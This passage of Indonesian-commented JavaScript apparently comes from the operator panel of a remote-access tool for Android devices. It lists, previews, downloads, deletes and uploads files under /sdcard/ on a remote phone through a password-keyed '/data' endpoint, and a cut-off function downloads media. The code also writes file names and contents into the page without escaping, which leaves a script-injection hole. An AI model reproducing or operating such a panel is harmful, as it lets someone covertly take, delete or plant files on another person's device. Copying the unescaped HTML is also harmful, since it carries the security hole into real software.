        link.download = filename + '_' + Date.now() + '.' + ext;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        addLog('info', 'Downloaded media: ' + filename);
    } catch(e) {
        alert('Gagal download: ' + e.message);
    }
}

// ============================================================
// 🔥 PANEL FILES - REAL!
// ============================================================
function renderFiles(path) {
    currentFilePath = path || '/sdcard/';
    var container = document.getElementById('fileList');
    container.innerHTML = '<div style="text-align:center;color:#8899aa;padding:20px;">⏳ Memuat file...</div>';
    
    // Kirim request ke server via data endpoint
    fetch('/data?key=' + PASSWORD + '&type=list_file&path=' + encodeURIComponent(currentFilePath))
        .then(function(r) { return r.json(); })
        .then(function(data) {
            container.innerHTML = '';
            
            // Breadcrumb
            var breadcrumb = document.createElement('div');
            breadcrumb.className = 'file-breadcrumb';
            breadcrumb.innerHTML = '<span>📁</span>';
            var parts = currentFilePath.replace(/^\/+/, '').split('/');
            var currentPath = '';
            parts.forEach(function(p, i) {
                if (p) {
                    currentPath += p + '/';
                    breadcrumb.innerHTML += '<span onclick="renderFiles(\'' + currentPath + '\')">' + p + '</span>';
                    if (i < parts.length - 1) breadcrumb.innerHTML += '<span style="color:#8899aa;">/</span>';
                }
            });
            if (!currentFilePath || currentFilePath === '/sdcard/') {
                breadcrumb.innerHTML += '<span style="color:#8899aa;">/sdcard/</span>';
            }
            container.appendChild(breadcrumb);
            
            // File list
            var list = document.createElement('div');
            
            if (data && data.files && data.files.length > 0) {
                var files = data.files;
                
                // Sort: folder first
                files.sort(function(a, b) {
                    if (a.isFolder && !b.isFolder) return -1;
                    if (!a.isFolder && b.isFolder) return 1;
                    return (a.name || '').localeCompare(b.name || '');
                });
                
                files.forEach(function(file) {
                    var item = document.createElement('div');
                    item.className = 'file-item';
                    
                    var icon = file.isFolder ? '📁' : '📄';
                    var size = file.isFolder ? '--' : formatSize(file.size || 0);
                    var fullPath = file.path || (currentFilePath + (file.name || ''));
                    
                    if (file.isFolder) {
                        item.onclick = function() { renderFiles(fullPath + '/'); };
                    } else {
                        item.onclick = function() { openFileModal(fullPath); };
                    }
                    
                    item.innerHTML = 
                        '<div class="name">' + icon + ' ' + (file.name || '') + '</div>' +
                        '<div style="display:flex;align-items:center;gap:15px;">' +
                        '<span class="size">' + size + '</span>' +
                        '<div class="actions">' +
                        '<button class="download-btn" onclick="event.stopPropagation();downloadFile(\'' + fullPath + '\')">📥</button>' +
                        '<button class="delete-btn" onclick="event.stopPropagation();deleteFile(\'' + fullPath + '\')">🗑️</button>' +
                        '</div>' +
                        '</div>';
                    
                    list.appendChild(item);
                });
            } else {
                list.innerHTML = '<div class="empty-state">📭 Tidak ada file di folder ini</div>';
            }
            
            container.appendChild(list);
        })
        .catch(function(e) {
            container.innerHTML = '<div class="empty-state">❌ Gagal memuat file: ' + e.message + '</div>';
        });
}

function formatSize(bytes) {
    if (!bytes || bytes === 0) return '0 B';
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
    return (bytes / 1073741824).toFixed(1) + ' GB';
}

function openFileModal(filePath) {
    var html = '<h3 style="color:#4fc3f7;margin-bottom:10px">📄 ' + filePath.split('/').pop() + '</h3>';
    html += '<p style="color:#8899aa;font-size:12px;margin-bottom:15px">Path: ' + filePath + '</p>';
    html += '<div style="text-align:center;padding:20px;color:#8899aa;">⏳ Memuat file...</div>';
    openModal(html);
    
    fetch('/data?key=' + PASSWORD + '&type=ambil_file&path=' + encodeURIComponent(filePath))
        .then(function(r) { return r.json(); })
        .then(function(data) {
            var body = document.getElementById('modalBody');
            if (data && data.content) {
                var content = data.content;
                var isImage = content.startsWith('data:image');
                var isText = !isImage && content.length < 50000;
                
                var htmlContent = '<h3 style="color:#4fc3f7;margin-bottom:10px">📄 ' + filePath.split('/').pop() + '</h3>';
                htmlContent += '<p style="color:#8899aa;font-size:12px;margin-bottom:15px">Path: ' + filePath + '</p>';
                
                if (isImage) {
                    htmlContent += '<img src="' + content + '" style="max-width:100%;max-height:70vh;border-radius:8px;">';
                } else if (isText) {
                    htmlContent += '<div style="background:#050a12;padding:15px;border-radius:8px;max-height:400px;overflow:auto;font-size:12px;font-family:monospace;color:#e0e0e0;white-space:pre-wrap;">' + content + '</div>';
                } else {
                    htmlContent += '<div style="background:#050a12;padding:15px;border-radius:8px;max-height:400px;overflow:auto;font-size:11px;font-family:monospace;color:#8899aa;word-break:break-all;">Binary file (' + content.length + ' chars)</div>';
                }
                
                htmlContent += '<div style="margin-top:15px;display:flex;gap:10px;">';
                htmlContent += '<button onclick="downloadFileDirect(\'' + filePath + '\')" style="flex:1;padding:8px;border-radius:6px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;">📥 Download</button>';
                htmlContent += '<button onclick="closeModal()" style="flex:1;padding:8px;border-radius:6px;border:1px solid #2a3f5f;background:transparent;color:#8899aa;cursor:pointer;">❌ Tutup</button>';
                htmlContent += '</div>';
                
                body.innerHTML = htmlContent;
            } else {
                body.innerHTML = '<div class="empty-state">❌ Gagal memuat file</div>';
            }
        })
        .catch(function(e) {
            document.getElementById('modalBody').innerHTML = '<div class="empty-state">❌ Error: ' + e.message + '</div>';
        });
}

function downloadFile(filePath) {
    fetch('/data?key=' + PASSWORD + '&type=ambil_file&path=' + encodeURIComponent(filePath))
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data && data.content) {
                var content = data.content;
                var fileName = filePath.split('/').pop();
                var link = document.createElement('a');
                link.href = content;
                link.download = fileName;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                addLog('info', 'Downloaded: ' + fileName);
            }
        })
        .catch(function(e) {
            alert('Gagal download: ' + e.message);
        });
}

function downloadFileDirect(filePath) {
    downloadFile(filePath);
    closeModal();
}

function deleteFile(filePath) {
    if (!confirm('Hapus file ' + filePath + '?')) return;
    
    fetch('/data?key=' + PASSWORD + '&type=hapus_file&path=' + encodeURIComponent(filePath), {
        method: 'DELETE'
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
        if (data && data.success) {
            addLog('info', 'Deleted: ' + filePath);
            renderFiles(currentFilePath);
        } else {
            alert('Gagal hapus file');
        }
    })
    .catch(function(e) {
        alert('Error: ' + e.message);
    });
}

function uploadFile() {
    var input = document.createElement('input');
    input.type = 'file';
    input.onchange = function(e) {
        var file = e.target.files[0];
        if (!file) return;
        
        var reader = new FileReader();
        reader.onload = function(ev) {
            var data = ev.target.result;
            var uploadPath = prompt('Path tujuan (contoh: /sdcard/Download/)', '/sdcard/Download/');
            if (!uploadPath) return;
            
            fetch('/data?key=' + PASSWORD + '&type=upload_file&path=' + encodeURIComponent(uploadPath + file.name), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: data, name: file.name })
            })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data && data.success) {
                    addLog('info', 'Uploaded: ' + file.name);
                    renderFiles(currentFilePath);
                } else {
                    alert('Gagal upload file');
                }
            })
            .catch(function(e) {
                alert('Error: ' + e.message);
            });
        };
        reader.readAsDataURL(file);
    };
    input.click();
}

    document.getElementById('modal').classList.add('active');

}
